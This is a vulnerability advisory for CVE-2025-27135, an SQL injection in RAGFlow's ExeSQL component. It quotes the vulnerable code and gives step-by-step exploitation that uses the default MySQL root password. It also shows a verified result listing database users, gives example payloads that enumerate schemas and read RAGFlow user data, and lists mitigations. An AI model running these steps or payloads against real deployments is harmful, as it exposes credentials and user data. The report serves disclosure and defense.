# CVE-2025-27135 Vulnerability Report

## Overview

**CVE ID:** CVE-2025-27135  
**Vulnerability Type:** SQL Injection (CWE-89)  
**Affected Software:** RAGFlow  
**Affected Versions:** <= 0.15.1  
**CVSS 3.1 Score:** 9.8 (Critical)  

## Vulnerability Description

RAGFlow is an open-source RAG (Retrieval-Augmented Generation) engine. The ExeSQL component in RAGFlow extracts SQL statements from user input and sends them directly to the database query without proper sanitization, allowing attackers to execute arbitrary SQL commands.

## Technical Analysis

### Vulnerable Code Location

File: `agent/component/exesql.py`

**Input Processing (lines 80-85):**
```python
ans = self.get_input()
ans = "".join(ans["content"]) if "content" in ans else ""
ans = re.sub(r'^.*?SELECT ', 'SELECT ', repr(ans), flags=re.IGNORECASE)
ans = re.sub(r';.*?SELECT ', '; SELECT ', ans, flags=re.IGNORECASE)
ans = re.sub(r';[^;]*$', r';', ans)
```

**Direct SQL Execution (line 113):**
```python
cursor.execute(single_sql)  # Vulnerable: No sanitization
```

### Root Cause

1. The ExeSQL component receives input from user messages via the chat interface
2. The input undergoes only basic regex processing to extract SELECT statements
3. The extracted SQL is executed directly via `cursor.execute()` without parameterization
4. No input validation or sanitization is performed to prevent SQL injection

## Attack Vector

### Prerequisites

- Access to RAGFlow web interface (registration is open by default)
- Ability to create Agent/Canvas workflows

### Exploitation Steps

1. Login to RAGFlow web interface at `http://localhost`

2. Navigate to Agent/Canvas section and create a new workflow

3. Configure the workflow with components:
   - **Begin** - Starting point
   - **Interact** - Receives user chat input
   - **ExeSQL** - Executes SQL (configure with target database credentials)
   - **Answer** - Displays query results

4. Configure ExeSQL component with database connection:
   ```
   db_type: mysql
   host: ragflow-mysql
   port: 3306
   username: root
   password: infini_rag_flow
   database: mysql
   ```

5. Save and run the workflow

6. In the chat dialog, send SQL statements directly:
   ```sql
   select user from mysql.user;
   ```

7. The SQL query results are returned in the chat response

### Verified Exploitation Result

Sending `select user from mysql.user;` returns:

| # | user |
|---|------|
| 0 | root |
| 1 | debian-sys-maint |
| 2 | mysql.infoschema |
| 3 | mysql.session |
| 4 | mysql.sys |

## Example Payloads

```sql
-- Read database users
SELECT user, host FROM mysql.user;

-- Get database version
SELECT @@version;

-- List all databases
SELECT schema_name FROM information_schema.schemata;

-- List all tables in a database
SELECT table_name FROM information_schema.tables WHERE table_schema='rag_flow';

-- Read RAGFlow user data
SELECT * FROM rag_flow.user LIMIT 10;
```

## Impact

- **Confidentiality:** Read sensitive data from the database including user credentials
- **Integrity:** Modify or delete database records (if UPDATE/DELETE allowed)
- **Availability:** Potential denial of service through destructive queries
- **System Compromise:** Could lead to further exploitation depending on database privileges

## Mitigation

1. **Use Parameterized Queries:** Replace direct SQL execution with parameterized queries
2. **Input Validation:** Implement strict whitelist-based validation for allowed SQL operations
3. **Least Privilege:** Configure database connections with minimal required privileges
4. **Query Auditing:** Log and monitor all SQL queries executed through ExeSQL
5. **Update:** Apply patches when available from RAGFlow maintainers

## References

- Official PoC: https://swizzky.notion.site/ragflow-exesql-150ca6df7c03806989cefde915cf8e42
- GitHub Advisory: GHSA-3gqj-66qm-25jq
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2025-27135
- RAGFlow Repository: https://github.com/infiniflow/ragflow

## Timeline

- **2025-02-25:** Vulnerability disclosed via GitHub Security Advisory
- **2025-02-25:** CVE-2025-27135 assigned
- **As of publication:** No patched version available
